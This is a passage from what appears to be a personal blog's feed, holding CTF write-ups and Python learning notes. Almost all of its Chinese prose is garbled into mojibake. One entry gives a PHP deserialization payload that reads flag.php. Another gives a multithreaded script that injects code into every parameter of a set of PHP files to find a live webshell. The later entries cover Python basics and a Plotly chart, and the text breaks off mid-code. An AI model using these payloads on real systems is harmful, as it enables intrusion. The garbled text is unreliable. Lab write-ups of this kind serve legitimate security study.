ä¸ºæœ€åçš„validå‡½æ•°ä¼šè¿›è¡Œä¸€æ­¥ååºåˆ—åŒ–ï¼‰ï¼Œå¹¶ä¸”è¦ç»•è¿‡ä¸¤å±‚é˜²æŠ¤ï¼š</p><p>ä¸¤ä¸ªé˜²æŠ¤ï¼š<br><strong>is_valid()</strong><br>è¦æ±‚æˆ‘ä»¬ä¼ å…¥çš„strçš„æ¯ä¸ªå­—æ¯çš„asciiå€¼åœ¨32å’Œ125ä¹‹é—´ã€‚å› ä¸ºprotectedå±æ€§åœ¨åºåˆ—åŒ–ä¹‹åä¼šå‡ºç°ä¸å¯è§å­—ç¬¦\00*\00ï¼Œä¸ç¬¦åˆä¸Šé¢çš„è¦æ±‚ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line"></span><br><span class="line">  for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line"></span><br><span class="line">â€‹    if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line"></span><br><span class="line">â€‹      return false;</span><br><span class="line"></span><br><span class="line">  return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº†pythonçš„ordå‡½æ•°ï¼š</p><p>[^]: ord () å‡½æ•°æ˜¯ chr () å‡½æ•°ï¼ˆå¯¹äº8ä½çš„ASCIIå­—ç¬¦ä¸²ï¼‰æˆ– unichr () å‡½æ•°ï¼ˆå¯¹äºUnicodeå¯¹è±¡ï¼‰çš„é…å¯¹å‡½æ•°ï¼Œå®ƒä»¥ä¸€ä¸ªå­—ç¬¦ï¼ˆé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²ï¼‰ä½œä¸ºå‚æ•°ï¼Œè¿”å›å¯¹åº”çš„ ASCII æ•°å€¼ï¼Œæˆ–è€… Unicode æ•°å€¼</p><p>ç»•è¿‡æ–¹æ³•ï¼šå› ä¸ºphp7.1ä»¥ä¸Šçš„ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥å¯ä»¥å°†å±æ€§æ”¹ä¸ºpublicï¼Œpublicå±æ€§åºåˆ—åŒ–ä¸ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦</p><p><strong>destruct()é­”æœ¯æ–¹æ³•</strong><br>op===â€2â€ï¼Œæ˜¯å¼ºæ¯”è¾ƒï¼Œï¼ˆtipsï¼šâ€œ2â€è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²ç±»å‹2ï¼‰<a href="https://www.runoob.com/php/php-types-comparisons.html">PHP ç±»å‹æ¯”è¾ƒ | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <strong>è€Œåœ¨process()å‡½æ•°ä¸­,</strong></p><p>op==â€2â€æ˜¯å¼±æ¯”è¾ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> ç»•è¿‡æ–¹æ³•ï¼šå¯ä»¥ä½¿ä¼ å…¥çš„opæ˜¯æ•°å­—2ï¼Œä»è€Œä½¿ç¬¬ä¸€ä¸ªå¼ºæ¯”è¾ƒè¿”å›false,è€Œä½¿ç¬¬äºŒä¸ªå¼±æ¯”è¾ƒè¿”å›true.</p><p><img src="/2021/07/26/buu/2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70" alt="img"></p><p>ç»•è¿‡ä¹‹åï¼Œå°±æ˜¯åˆ°äº†å…³é”®ä¸€æ­¥ï¼Œè¦è¿›è¡Œæœ¬åœ°åºåˆ—åŒ–æ“ä½œï¼š</p><p>æˆ‘ç›´æ¥ç…§æ¬äº†å¤§ä½¬çš„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public  $op &#x3D; 2;</span><br><span class="line">    public  $filename &#x3D; &quot;flag.php&quot;;</span><br><span class="line">    public  $content &#x3D; &quot;1&quot;;        &#x2F;&#x2F;å› ä¸ºdestruceå‡½æ•°ä¼šå°†contentæ”¹ä¸ºç©ºï¼Œæ‰€ä»¥contentçš„å€¼éšæ„ï¼ˆä½†æ˜¯è¦æ»¡è¶³is_valid()å‡½æ•°çš„è¦æ±‚ï¼‰</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new FileHandler();</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è®¿é—®xu.php</p><p><img src="/2021/07/26/buu/2/image-20210726200434420.png" alt="image-20210726200434420"></p><p>â€‹        æ„å»ºpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure><p>â€‹        F12å¾—åˆ°flagï¼š</p><p><img src="/2021/07/26/buu/2/image-20210726200827967.png" alt="image-20210726200827967"></p><p>æœ¬æ–‡å€Ÿé‰´äºï¼š[<a href="https://blog.csdn.net/RABCDXB/article/details/114297291">ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz_RABCDXBçš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯ 2019é«˜æ˜çš„é»‘å®¢</title>
      <link href="/2021/07/26/buu/1/"/>
      <url>/2021/07/26/buu/1/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/26/buu/1/image-20210726102939511.png" alt="image-20210726102939511"></p><p>æ‰“å¼€é¶æœºåï¼Œç½‘é¡µæç¤ºä¸‹è½½æºç ï¼š<a href="http://www.tar.gz/">www.tar.gz</a> </p><p>çŒœæµ‹é‡Œé¢åŒ…å«å¯ä»¥åˆ©ç”¨çš„æ¼æ´æ–‡ä»¶ã€‚</p><p>ç„¶åå¼€å§‹äº†æ¼«é•¿çš„ä¸‹è½½ã€‚ã€‚ã€‚</p><p>ä¸‹è½½å®Œæˆåï¼Œæˆ‘ä»¬å‘ç°é‡Œé¢åŒ…å«çš„æ–‡ä»¶æŒºå¤šçš„ï¼Œè€Œä¸”æ˜¯å¾ˆå¤šéƒ½ä¸ºæœ¨é©¬æ–‡ä»¶ï¼Œæ‰€ä»¥æ’é™¤äº†ç”¨360ä¾¦æµ‹å‡ºç›®æ ‡æ–‡ä»¶ã€‚</p><p>æŸ¥çœ‹æŸäº›æ–‡ä»¶å‘ç°å¯ä»¥åˆ©ç”¨GETå’ŒPOSTä¼ å‚åˆ©ç”¨ã€‚</p><p>æ‰¾åˆ°å¤§ä½¬å†™çš„è„šæœ¬ï¼Œç”¨pythonæ¥è·‘å°±ä¸ç”¨ä¸€ä¸ªä¸ªè¯•äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&#39;å¼€å§‹æ—¶é—´ï¼š  &#39;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1&#x3D;threading.Semaphore(100)    #è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span><br><span class="line">filePath &#x3D; r&quot;D:&#x2F;soft&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;src&#x2F;&quot;</span><br><span class="line">os.chdir(filePath)#æ”¹å˜å½“å‰çš„è·¯å¾„</span><br><span class="line">requests.adapters.DEFAULT_RETRIES &#x3D; 5#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span><br><span class="line">files &#x3D; os.listdir(filePath)</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line">session.keep_alive &#x3D; False # è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding&#x3D;&#39;utf-8&#39;) as f:#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span><br><span class="line">            gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">            posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">    data &#x3D; &#123;&#125;#æ‰€æœ‰çš„$_POST</span><br><span class="line">    params &#x3D; &#123;&#125;#æ‰€æœ‰çš„$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;src&#x2F;&#39;+file</span><br><span class="line">    req &#x3D; session.post(url, data&#x3D;data, params&#x3D;params)#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span><br><span class="line">    req.close()# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span><br><span class="line">    req.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    content &#x3D; req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span><br><span class="line">        flag &#x3D; 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req &#x3D; session.get(url+&#39;?%s&#x3D;&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)</span><br><span class="line">            content &#x3D; req.text</span><br><span class="line">            req.close()# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag &#x3D; 1</span><br><span class="line">                break</span><br><span class="line">        if flag !&#x3D; 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req &#x3D; session.post(url, data&#x3D;&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)</span><br><span class="line">                content &#x3D; req.text</span><br><span class="line">                req.close()# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag &#x3D;&#x3D; 1:#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag&#x3D;&#x3D;1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span><br><span class="line">            param &#x3D; a</span><br><span class="line">        else:</span><br><span class="line">            param &#x3D; b</span><br><span class="line">        print(&#39;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#39;+file+&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot; %param)</span><br><span class="line">        print(&#39;ç»“æŸæ—¶é—´ï¼š  &#39; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:#åŠ å…¥å¤šçº¿ç¨‹</span><br><span class="line">   t &#x3D; threading.Thread(target&#x3D;get_content, args&#x3D;(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><p><img src="/2021/07/26/buu/1/image-20210726114732836.png" alt="image-20210726114732836"></p><p>çœŸçš„å¤ªè†œæ‹œäº†ï¼Œå•çº¿ç¨‹çš„è„šæœ¬æˆ‘éƒ½ä¸ä¼šå†™ã€‚ã€‚ã€‚</p><p>å¦‚å›¾æ‰¾åˆ°äº†å¯åˆ©ç”¨å‚æ•°å’Œæ–‡ä»¶</p><p>æ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œè®¿é—®å¯¹åº”æ–‡ä»¶æ¥è¿›è¡Œåˆ©ç”¨</p><p>ç»“æœå¦‚å›¾</p><p><img src="/2021/07/26/buu/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(301).png" alt="å±å¹•æˆªå›¾(301)"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python_tip</title>
      <link href="/2021/07/22/python/python_tip/"/>
      <url>/2021/07/22/python/python_tip/</url>
      
        <content type="html"><![CDATA[<h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>æ­å»ºpythonçš„ç¼–ç¨‹ç¯å¢ƒï¼šsubline textã€pycharmâ€¦â€¦</p><h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>å˜é‡ï¼Œegï¼šmessage  =  â€˜â€™Hello Worldâ€</p><p>â€‹                    print(message)</p><p>è¾“å‡ºï¼šHello Worldï¼Œè¿™é‡Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªåä¸ºmessageçš„å˜é‡ï¼Œå®ƒæŒ‡å‘çš„å€¼ä¸ºæ–‡æœ¬â€œHello Worldâ€ã€‚</p><p>åœ¨ç¨‹åºä¸­å¯éšæ—¶æ”¹å˜å˜é‡çš„å€¼ï¼Œè€Œpythonå°†å§‹ç»ˆè®°å½•å˜é‡çš„æœ€æ–°å€¼ã€‚</p><p>å˜é‡å‘½åæ¡ä»¶ï¼š</p><p>â€‹                        1.åªèƒ½åŒ…å«æ•°å­—ã€å­—æ¯å’Œä¸‹åˆ’çº¿ã€‚ä¸”å¼€å¤´åªèƒ½ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´ï¼Œä¸èƒ½ä»¥æ•°å­—å¼€å¤´ã€‚</p><p>â€‹                        2.ä¸èƒ½åŒ…å«ç©ºæ ¼ï¼Œä½†å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿æ¥åˆ†éš”å…¶ä¸­çš„å•è¯ã€‚</p><p>â€‹                        3.å‹¿å°†pythonå…³é”®å­—å’Œå‡½æ•°åä½œä¸ºå˜é‡åã€‚</p><p>â€‹                        4.åº”è¯¥ç®€çŸ­åˆå…·æœ‰æè¿°æ€§ã€‚</p><p>â€‹                        5.æ•°å­—1å’Œå­—æ¯lï¼Œæ•°å­—0å’Œå­—æ¯oè¦æ³¨æ„åŒºåˆ†ã€‚</p><p>è‹¥å‡ºç°é”™è¯¯æ—¶ï¼Œå¾€å¾€å¯ä»¥è§åˆ°    Tracebackï¼ˆmost recent call mostï¼‰çš„è§£é‡Šå™¨å‘ŠçŸ¥é”™è¯¯ã€‚</p><p>å­—ç¬¦ä¸²ï¼Œå°±æ˜¯ä¸€ç³»åˆ—å­—ç¬¦ï¼Œç”¨å¼•å·æ‹¬èµ·çš„éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œå•åŒå¼•å·çš†å¯ã€‚</p><p>â€œThis is a string.â€</p><p>â€˜This is a string.â€™</p><p>æ–¹æ³•ä¿®æ”¹å­—ç¬¦å¤§å°å†™ï¼šå˜é‡å.title()ï¼Œé¦–å­—æ¯å¤§å†™</p><p>â€‹                                       å˜é‡å.upper()ï¼Œå…¨éƒ¨å¤§å†™</p><p>â€‹                                        å˜é‡å.lower()ï¼Œå…¨éƒ¨å°å†™</p><p>å­—ç¬¦ä¸²çš„ç»„åˆï¼Œå¼•å·é‡ŒåŠ ä¸Šä¸­æ‹¬å·ï¼Œegï¼š</p><p>â€‹    <code>first_name = &quot;ada&quot;</code></p><p>â€‹    <code>last_name = &quot;lovelace&quot;</code></p><p>â€‹    <code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p><p>â€‹    <code>print(full_name)</code></p><p>è¿™é‡Œçš„å­—ç¬¦ä¸²å‘½åä¸ºfå­—ç¬¦ä¸²ï¼Œfæ˜¯formatï¼ˆè®¾ç½®æ ¼å¼ï¼‰çš„ç®€å†™ã€‚</p><p>æ·»åŠ ç©ºç™½ï¼šç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼Œ /t, /n</p><p>åˆ é™¤ç©ºç™½ï¼šæ–¹æ³•rstrip</p><p>åŒæ—¶ç»™å¤šä¸ªå˜é‡èµ‹å€¼ï¼šxï¼Œyï¼Œz = 0ï¼Œ0ï¼Œ0</p><p>å¸¸é‡ï¼šåœ¨ä»£ç ä¸­ï¼Œè¦æŒ‡å‡ºåº”å°†ç‰¹å®šçš„å˜é‡è§†ä¸ºå¸¸é‡ï¼Œå¯å°†å…¶å­—æ¯å…¨éƒ¨å¤§å†™ã€‚</p><p>æ³¨é‡Šï¼šå¥å­å‰åŠ #å·ã€‚</p><h3 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h3>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python_visual</title>
      <link href="/2021/07/19/python/python-visual/"/>
      <url>/2021/07/19/python/python-visual/</url>
      
        <content type="html"><![CDATA[<p>â€‹    ä½¿ç”¨Plotlyå¯è§†åŒ–ä»“åº“</p><p>â€‹    åˆ›å»ºäº†å¯è§†åŒ–pythonå›¾è¡¨ï¼Œä»¥htmlå½¢å¼å‘ˆç°</p><p><img src="/2021/07/19/python/python-visual/image-20210719204819823.png" alt="image-20210719204819823"></p><p>ä¸Šå›¾ä¸ºGithubä¸Špythonåº“å—æ¬¢è¿ç¨‹åº¦</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">from plotly.graph_objs import Bar</span><br><span class="line">from plotly import offline</span><br><span class="line"></span><br><span class="line">#æ‰§è¡ŒAPIè°ƒç”¨å¹¶å­˜å‚¨å“åº”</span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;api.github.com&#x2F;search&#x2F;repositories?q&#x3D;language:python&amp;sort&#x3D;stars&#39;</span><br><span class="line">headers &#x3D; &#123;&#39;Accept&#39;:&#39;application&#x2F;vnd.github.v3+json&#39;&#125;</span><br><span class="line">r &#x3D; requests.get(url,headers&#x3D;headers)</span><br><span class="line">print(f&quot;Status code: &#123;r.status_code&#125;&quot;)</span><br><span class="line">response_dict &#x3D; r.json()</span><br><span class="line">repo_dicts &#x3D; response_dict[&#39;items&#39;]</span><br><span class="line">repo_names,stars &#x3D; [], []</span><br><span class="line">for repo_dict in repo_dicts:</span><br><span class="line">    repo_names.append(repo_dict[&#39;name&#39;])</span><br><span class="line">    stars.append(repo_dict[&#39;stargazers_count&#39;])</span><br><span class="line"></span><br><span class="line">#å¯è§†åŒ–</span><br><span class="line">data &#x3D; [&#123;</span><br><span class="line">    &#39;type&#39;: &#39;bar&#39;,</span><br><span class="line">    &#39;x&#39;: repo_names,</span><br><span class="line">    &#39;y&#39;:stars,</span><br><span class="line">&#125;]</span><br><span class="line">my_layout &#x3D; &#123;</span><br><span class="line">    &#39;title&#39;:&#39;Githubä¸Šæœ€å—æ¬¢è¿çš„Pythoné¡¹ç›®&#39;,</span><br><span class="line">    &#39;xaxis&#39;:&#123;&#39;title&#39;: &#39;Repository&#39;&#125;,</span><br><span class="line">    &#39;yaxis&#39;:&#123;&#39;title&#39;:&#39;Stars&#39;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">fig &#x3D; &#123;&#39;data&#39;: data, &#39;layout&#39;:my_layout&#125;</span><br><span class="line">offline.plot(fig, filename&#x3D;&#39;python_repos.html&#39;)</span><br></pre></td></tr></table></figure><p>Status code: 200 ï¼Œæ„å‘³ç€è®¿é—®æˆåŠŸã€‚</p><p>Tips:å¦‚æœé‡åˆ°ä»£ç è¿è¡Œå¤±è´¥å¹¶ä¸”æ˜¯å‡ºç°äº†å¦‚ä¸‹ç±»ä¼¼é”™è¯¯</p><hr><p>Traceback (most recent call last)<br><strong>C:\Users\mr-chen\Anaconda3\envs\hadoop\lib\site-packages\urllib3\connection.py in _new_conn(self)</strong><br> 158             conn = connection.create_connection(</p><hr><p>è¿™æ˜¯å› ä¸ºurlè·¯å¾„ä¸ºGitHubçš„ç½‘ç«™ï¼Œå¯¹äºå›½å†…è®¿é—®çš„æˆ‘ä»¬æ¥è¯´ä¸ç¨³å®š</p><p>å³ä½¿æ·»åŠ è¿›äº†hostsæ–‡ä»¶ä¹Ÿå¶å°”ä¼šå‡ºç°è®¿é—®å¤±è´¥çš„æƒ…å†µ</p><p>åœ¨ä»£ç è¿è¡Œæ˜¯å°±ä¼šå‡ºç°ä¸Šè¿°tracebackæŠ¥é”™æŠ¥å‘Šã€‚</p><p>æ‰¾åˆ°è§£å†³æ–¹æ³•çš„ç›¸å…³æ–‡ç« æ¥æºäºï¼š</p><p><a href="https://blog.csdn.net/visoprkx/article/details/88925116">ä½¿ç”¨python pyhdfsæ“ä½œhadoop å‡ºç°ConnectionError: HTTPConnectionPool(host=â€™bigdata-senior03.chybinmy.comâ€™_visoprkxçš„ä¸“æ -CSDNåšå®¢</a></p><p>æ”¹è¿›Plotlyå›¾è¡¨ã€æ·»åŠ è‡ªå®šä¹‰å·¥å…·æç¤ºã€åœ¨å›¾è¡¨ä¸­æ·»åŠ å¯å•å‡»çš„é“¾æ¥åçš„ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">from plotly.graph_objs import Bar</span><br><span class="line">from plotly import offline</span><br><span class="line"></span><br><span class="line">#æ‰§è¡ŒAPIè°ƒç”¨å¹¶å­˜å‚¨å“åº”</span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;api.github.com&#x2F;search&#x2F;repositories?q&#x3D;language:python&amp;sort&#x3D;stars&#39;</span><br><span class="line">headers &#x3D; &#123;&#39;Accept&#39;:&#39;application&#x2F;vnd.github.v3+json&#39;&#125;</span><br><span class="line">r &#x3D; requests.get(url,headers&#x3D;headers)</span><br><span class="line">print(f&quot;Status code: &#123;r.status_code&#125;&quot;)</span><br><span class="line">response_dict &#x3D; r.json()</span><br><span class="line">repo_dicts &#x3D; response_dict[&#39;items&#39;]</span><br><span class="line">repo_links, stars, labels &#x3D; [], [], []</span><br><span class="line">for repo_dict in repo_dicts:</span><br><span class="line">    repo_name &#x3D; repo_dict[&#39;name&#39;]</span><br><span class="line">    repo_url &#x3D; repo_dict[&#39;html_url&#39;]</span><br><span class="line">    repo_link &#x3D; f&quot;&lt;a href&#x3D;&#39;&#123;repo_url&#125;&#39;&gt;&#123;repo_name&#125;&lt;&#x2F;a&gt;&quot;</span><br><span class="line">    repo_links.append(repo_link)</span><br><span class="line">    stars.append(repo_dict[&#39;stargazers_count&#39;])</span><br><span class="line"></span><br><span class="line">    owner &#x3D; repo_dict[&#39;owner&#39;][&#39;login&#39;]</span><br><span class="line">    description &#x3D; repo_dict[&#39;description&#39;]</span><br><span class="line">    label &#x3D; f&quot;&#123;owner&#125;&lt;br &#x2F;&gt;&#123;description&#125;&quot;</span><br><span class="line">    labels.append(label)</span><br><span class="line"></span><br><span class="line">#å¯è§†åŒ–</span><br><span class="line">data &#x3D; [&#123;</span><br><span class="line">    &#39;type&#39;: &#39;bar&#39;,</span><br><span class="line">    &#39;x&#39;: repo_links,</span><br><span class="line">    &#39;y&#39;:stars,</span><br><span class="line">    &#39;hovertext&#39;: labels,</span><br><span class="line">    &#39;marker&#39;: &#123;</span><br><span class="line">        &#39;color&#39;: &#39;rgb(60, 100, 150)&#39;,</span><br><span class="line">        &#39;line&#39;: 